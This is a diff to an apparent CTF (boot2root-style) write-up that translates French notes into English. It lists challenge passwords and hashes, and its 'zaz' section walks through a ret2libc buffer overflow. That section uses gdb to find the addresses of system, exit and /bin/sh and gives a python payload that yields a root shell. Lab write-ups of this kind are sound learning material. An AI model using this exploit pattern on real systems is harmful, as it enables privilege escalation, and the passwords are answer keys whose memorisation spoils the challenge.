@@ -133,7 +133,7 @@ MY PASSWORD IS: Iheartpwnage
 Now SHA-256 it and submit%  
 ```
 
-So the password is : `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` in sha-256
+password : `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` (in sha-256)
 
 ## Laurie
 
@@ -238,13 +238,13 @@ opekMq
 4 2 6 3 1 5
 ```
 password : `Publicspeakingisveryeasy.126241207201b2149opekMq426315` \
-Attention, il faut utiliser celui-ci (erreur sujet): `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
+Warning, use this one (subject error?): `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
 
 ## Thor
-On transforme le fichier `turtle` en script python et on obtient une tortue qui dessine les lettres  `S` `L` `A` `S` `H` \
-A la fin du fichier on trouve : `can you diggest this message ?`, on comprend que nous devons crypter le message en md5.
+Convert `turtle` file in python and we get a turtle drawing these letters:  `S` `L` `A` `S` `H` \
+At the end of the file => `can you diggest this message ?` => A message digest is a cryptographic hash function
 
-password : `646da671ca01bb5d84dbb5fb2238dc8e`
+password : `646da671ca01bb5d84dbb5fb2238dc8e` (encrypt with MD5)
 
 ## Zaz
 Une fois log avec l'id de zaz on a un executable `exploit_me`, avec ghidra on sait que le code source de cet executable est sensiblement :
@@ -261,10 +261,9 @@ bool main(int param_1,int param_2)
 }
 ```
 
-On va donc faire un buffer overflow dans le but de lancer un shell en tant que root;
-`gdb ./exploit_me`
-Dans gdb on doit droiver l'addr de `/bin/sh`
+Exploit the buffer overflow to launch a shell as root
 ```
+$ gdb ./exploit_me
 (gdb) info proc map
 	process 1921
 	Mapped address spaces:
@@ -288,10 +287,8 @@ Dans gdb on doit droiver l'addr de `/bin/sh`
 	0xb7f8cc58
 	1 pattern found.
 ```
-Donc `0xb7f8cc58`
-\
-\
-Il nous faut aussi l'adresse de la fonction system
+address of `/bin/sh` = `0xb7f8cc58`
+
 ```
 (gdb) info function system
 	All functions matching regular expression "system":
@@ -301,14 +298,14 @@ Il nous faut aussi l'adresse de la fonction system
 	0xb7e6b060  system
 	0xb7f49550  svcerr_systemerr
 ```
-Donc `0xb7e6b060`
-\
-\
-Pareil pour exit on obtien l'adresse `0xb7e5ebe0`
+address of `system` = `0xb7e6b060`
 
-On donne tout ca a manger a exploit_me :
-```./exploit_me $(python -c 'print "a"* 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"') ```\
-Et paf ca fait des chocapics !
+
+Repeat for `exit`:\
+address of `exit` = `0xb7e5ebe0`
+
+now run :
+
 ```
 $ ./exploit_me $(python -c 'print "a"* 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"')
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`�����X���
@@ -319,4 +316,5 @@ $ whoiam
 $ whoami
 root
 ```
-Et voilà !
+
+The end !
